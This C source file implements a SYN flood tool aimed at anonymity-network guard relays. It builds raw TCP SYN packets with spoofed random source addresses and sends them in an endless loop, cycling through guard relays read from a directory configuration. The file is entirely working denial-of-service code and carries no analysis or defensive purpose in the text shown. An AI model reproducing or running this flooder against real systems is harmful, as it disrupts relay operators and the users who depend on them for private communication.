#include "syn_flooder.h"
bool g_client_defense_active = false;

unsigned short checksum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short retval;

    sum = INIT_SUM;
    while(nbytes > LAST_BYTE) 
    {
        sum += *ptr++;
        nbytes -= PAIR_OF_BYTES;
    }

    if(nbytes == LAST_BYTE) 
    {
        oddbyte = RESET;
        *((__u_char*)&oddbyte) = *(__u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum >>CARRY_BITS) + (sum & LOW_SIXTEEN_MASK);
    sum = sum + (sum >> CARRY_BITS);
    retval=(short)~sum;
    return(retval);
}

void generate_random_ip_address(char *ip_address)
{
    sprintf(ip_address, "%d.%d.%d.%d", rand() % IP_MAX_POSSIBBLE, rand() % IP_MAX_POSSIBBLE, rand() % IP_MAX_POSSIBBLE, 
            rand() % IP_MAX_POSSIBBLE);
}

void init_structs(struct iphdr *iph, struct tcphdr *tcph, struct sockaddr_in *sin, pseudo_header_t *pseudo_header, char *source_ip, 
                char *target_ip, int target_port)
{
    sin->sin_family = AF_INET;
    sin->sin_port = htons(target_port);
    sin->sin_addr.s_addr = inet_addr(target_ip);

    iph->ihl = IP_HEADER_LEN;
    iph->version = IPV4;
    iph->tos = REGULAR_PRIORITY;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(rand() % MAX_POSSIBLE_ID); 
    iph->frag_off = 0;
    iph->ttl = TIME_TO_LIVE;
    iph->protocol = IPPROTO_TCP;
    iph->check = INIT_SUM; 
    iph->saddr = inet_addr(source_ip); 
    iph->daddr = sin->sin_addr.s_addr;  
    iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));

    tcph->source = htons(rand() % MAX_POSSIBLE_ID + SAVED_PORTS);
    tcph->dest = htons(target_port);
    tcph->seq = INIT_SEQ;
    tcph->ack_seq = 0;
    tcph->doff = DATA_OFFSET;  
    tcph->fin = FLAG_OFF; tcph->syn = FLAG_ON; tcph->rst = FLAG_OFF; tcph->psh = FLAG_OFF; tcph->ack = FLAG_OFF; tcph->urg = FLAG_OFF; 
    tcph->window = htons(WINDOW_SIZE); 
    tcph->check = INIT_SUM; 
    tcph->urg_ptr = FLAG_OFF;

    
    pseudo_header->source_addr = inet_addr(source_ip);
    pseudo_header->dest_addr = sin->sin_addr.s_addr;
    pseudo_header->place_holder = 0;
    pseudo_header->protocol = IPPROTO_TCP;
    pseudo_header->tcp_len = htons(sizeof(struct tcphdr));
}

relay_decript_t * get_guards_list(uint32_t *guards_amount)
{
    uint32_t total_relays = 0;
    relay_decript_t *all_relays = fetch_relays_from_dir("dir.cfg", &total_relays);
    if(all_relays == NULL || total_relays == 0)
    {
        fprintf(stderr, "Failed to fetch relays from directory server.\n");
        *guards_amount = 0;
        return NULL;
    }
    else
    {
        relay_decript_t *guards = malloc(total_relays * sizeof(relay_decript_t));
        uint32_t guard_count = 0;

        for (uint32_t index = 0; index < total_relays; index++) 
        {
            if (all_relays[index].is_guard == true) 
            {
                guards[guard_count] = all_relays[index];
                guard_count++;
            }
        }
        free(all_relays);
        *guards_amount = guard_count;
        return guards;
    }
}

int main(void)
{
    srand(time(NULL));
    int socket_num = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(socket_num == -1) 
    {
        perror("Failed to create raw socket. Did you run with sudo?");
        exit(1);
    }

    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_num, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) 
    {
        perror("Error setting IP_HDRINCL");
        exit(1);
    }

    char datagram[DATAGRAM_SIZE];
    memset(datagram, 0, DATAGRAM_SIZE);

    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    pseudo_header_t pseudo_header;
    
    uint32_t target_guard_amount = 0;
    relay_decript_t *guards_list = get_guards_list(&target_guard_amount);
    if(target_guard_amount == 0 || guards_list == NULL)
    {
        fprintf(stderr, "No guards found in the directory server response. Exiting.\n");
    }
    else
    {
        printf("starting BALANCED SYN FLOOD atack\n");
        int index = 0; 
        while(true)
        {
            memset(datagram, 0, DATAGRAM_SIZE);
            char target_ip[IP_BUFFER_LEN];
            snprintf(target_ip, IP_BUFFER_LEN, "%d.%d.%d.%d", guards_list[index].relay_ip[0], guards_list[index].relay_ip[1], 
                    guards_list[index].relay_ip[2], guards_list[index].relay_ip[3]);
            int target_port = guards_list[index].relay_port;
            char source_ip[IP_BUFFER_LEN];
            generate_random_ip_address(source_ip);
            init_structs(iph, tcph, &sin, &pseudo_header, source_ip, target_ip, target_port);
            int pseudo_packet_len = sizeof(pseudo_header_t) + sizeof(struct tcphdr);
            char *pseudo_packet = malloc(pseudo_packet_len);
            memcpy(pseudo_packet, (char *)&pseudo_header, sizeof(pseudo_header_t));
            memcpy(pseudo_packet + sizeof(pseudo_header_t), tcph, sizeof(struct tcphdr));
            tcph->check = checksum((unsigned short *)pseudo_packet, pseudo_packet_len);
            free(pseudo_packet);
            if (sendto(socket_num, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) 
            {
                perror("sendto failed");
            }
            index = (index + 1) % target_guard_amount;
            usleep(10);

        }
        free(guards_list);
    }
    return 0;
}